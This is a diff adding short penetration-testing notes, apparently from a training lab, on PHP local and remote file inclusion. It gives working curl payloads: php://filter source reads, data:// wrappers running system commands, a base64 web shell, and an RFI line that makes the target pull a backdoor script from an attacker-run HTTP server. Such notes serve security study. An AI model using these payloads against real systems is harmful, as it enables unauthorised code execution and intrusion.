@@ -1,0 +1,26 @@
+# Attacks
+- php://filter --> read content
+		- Unwrapped request
+			- curl http://mountaindesserts.com/meteor/index.php?page=admin.php
+		- PHP wrapped
+			- curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+		- Base 64 encoded
+			- curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+		- Decode
+			- echo [$encoded http response] | base64 -d
+				- -d --> decode
+	- data:// ---> execute code
+		- **** [allow_url_include] setting must be enabled ****
+		- embed URL-encoded PHP
+			- curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+		- Base 64 encoded
+			1. echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+			2. curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+- Remote File Inclusion (RFI)
+	- Example:
+		- Using simple-backdoor.php
+			- [kali] /usr/share/webshells/php/
+		- Startup web server
+			- python3 -m http.server 80
+		- Use curl with included file
+			- curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
